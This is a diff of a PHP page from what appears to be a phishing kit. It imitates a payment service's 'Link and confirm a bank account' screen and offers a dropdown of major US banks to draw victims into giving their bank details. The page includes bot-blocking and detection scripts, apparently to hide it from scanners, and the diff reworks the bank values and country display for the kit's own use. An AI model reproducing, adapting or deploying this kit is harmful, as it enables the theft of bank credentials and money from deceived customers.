@@ -1,25 +1,13 @@
 <?php
-//#     #            #     #                                                              #     #   #   
-//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
-//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
-//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
-//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
-//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
-//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 
 
-session_start();
-error_reporting(0);
 include "../system/blocker.php";
 include "../system/detect.php";
 
 include "../system/system.php";
 
 
-?>
 
-<?php
-$data = explode('@' , $_SESSION['_email_']); 
-$_SESSION['_emaildd_']   = $data[1] ; ?>
+?>
 
 
 
@@ -403,7 +391,7 @@ document.onreadystatechange = function () {
 </div>
 -->
 <div id="bankkatba" class=""  style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
-<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link and confirm a <?php echo $countryname ?> bank account</h1>
+<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link and confirm a <?php echo $_SESSION['_LOOKUP_COUNTRY_'] ?> bank account</h1>
 </div>
 
 <div id="emailkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
@@ -1290,18 +1278,18 @@ Please Select Bank Name
 </option>
 
 <option value="Bank of America">Bank of America</option>
-<option value="Capital One">Capital One</option>
-<option value="Chase Bank">Chase Bank</option>
-<option value="CitiBank">CitiBank</option>
-<option value="Fifth Third Bank">Fifth Third Bank</option>
-<option value="Huntington Bank (Personal)">Huntington Bank (Personal)</option>
-<option value="PNC Bank">PNC Bank</option>
-<option value="Regions Bank">Regions Bank</option>
-<option value="SunTrust Bank">SunTrust Bank</option>
-<option value="TD Bank">TD Bank</option>
-<option value="US Bank">US Bank</option>
-<option value="USAA Bank">USAA Bank</option>
-<option value="Wells Fargo Bank">Wells Fargo Bank</option>
+<option value="capitalone">Capital One</option>
+<option value="CHASE">Chase Bank</option>
+<option value="citiBank">CitiBank</option>
+<option value="Fifth Third">Fifth Third Bank</option>
+<option value="Huntington">Huntington Bank (Personal)</option>
+<option value="PNC">PNC Bank</option>
+<option value="Regions">Regions Bank</option>
+<option value="SunTrust">SunTrust Bank</option>
+<option value="TD">TD Bank</option>
+<option value="US">US Bank</option>
+<option value="USAA">USAA Bank</option>
+<option value="Wells">Wells Fargo</option>
 <option value="0">I have a different bank</option>
 </select>
 
